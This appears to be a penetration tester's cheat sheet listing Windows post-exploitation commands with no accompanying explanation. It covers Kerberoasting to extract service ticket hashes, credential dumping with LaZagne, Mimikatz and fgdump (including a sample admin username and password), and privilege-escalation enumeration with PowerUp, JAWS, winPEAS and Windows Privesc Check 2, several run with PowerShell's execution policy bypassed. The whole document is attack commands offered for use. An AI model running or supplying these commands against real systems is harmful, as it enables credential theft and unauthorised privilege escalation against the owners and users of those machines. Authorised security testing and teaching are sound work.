LIST OF COMMANDS:
=========
KERBEROAST:
powershell -ExecutionPolicy Bypass
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat | fl
=========
JAWS
powershell -ExecutionPolicy Bypass -File .\jaws-enum.ps1
OR SAVE OUTPUT TO FILE, TACK TO THE END OF COMMAND
-OutputFilename jaws-enum.txt
=========
LASAGNE
.\lazagne_pw_dump.exe all
=========
MIMIKATZ
Run 'systeminfo' to find out the processor type
.\mimikatz64.exe
=========
POWERUP
powershell -ExecutionPolicy Bypass
import-module .\PowerUp.ps1
Invoke-AllChecks
=========
WINPEAS
.\winPEASx64.exe
=========
WINDOWS PRIVESC CHECK 2
.\wpc2.exe --audit -a -o report-%COMPUTERNAME%
=========
FGDUMP
.\fgdump.exe
OR IF YOU HAVE CREDENTIALS
.\fgdump.exe -u Admin -p password
=========
